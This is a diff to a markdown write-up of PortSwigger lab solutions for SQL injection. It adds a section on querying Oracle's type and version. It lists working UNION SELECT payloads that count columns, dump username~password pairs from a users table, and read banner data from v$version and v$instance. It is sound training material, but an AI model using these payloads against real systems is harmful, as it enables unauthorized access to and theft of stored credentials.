@@ -77,15 +77,40 @@ Content in the first column | Content in the second column
 1. *Solutions*
 
    By applying `'+UNION+SELECT+NULL,NULL--` we can say the database has tow columns.
-   By applying `'+UNION+SELECT+NULL,'abc'--` we can ay the second column has string values.
+   By applying `'+UNION+SELECT+NULL,'abc'--` we can say the second column has string values.
    Now to retrieve data from only one column we can use the following payload
    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
    
   `||'~'||` will join `username and password` like  `administrator~wet39rb7kc6kt99lq0o6`
    
  Now to solve the challenge go to Response in Burp Suite and get the username~password `administrator~wet39rb7kc6kt99lq0o6`
+
+
+<h3>- Examining the database in SQL injection attacks</h3>
+
+[7.Lab: SQL injection attack, querying the database type and version on Oracle]()
  
+1. *Solutions*
+
+   On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+
+There is a built-in table on Oracle called DUAL which you can use for this purpose. For example: UNION SELECT 'abc' FROM DUAL 
+
+   By applying `'+UNION+SELECT+NULL,NULL+FROM+DUAL--` we can say the database has tow columns.
+   By applying `'+UNION+SELECT+'abc','xyz'+FROM+DUAL--` we can say the first and second columns have string values.
+   to retrieve the version of the database, for Oracle we can use [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet):
+
+   * SELECT banner FROM v$version
+   * SELECT version FROM v$instance
+   
+   the payload will be like:
+   
+   `'+UNION+SELECT+banner,NULL+FROM+v$version--`
+   `'+UNION+SELECT+version,NULL+FROM+v$instance--`
+   
+   
  
- 
+   
+   
    
    
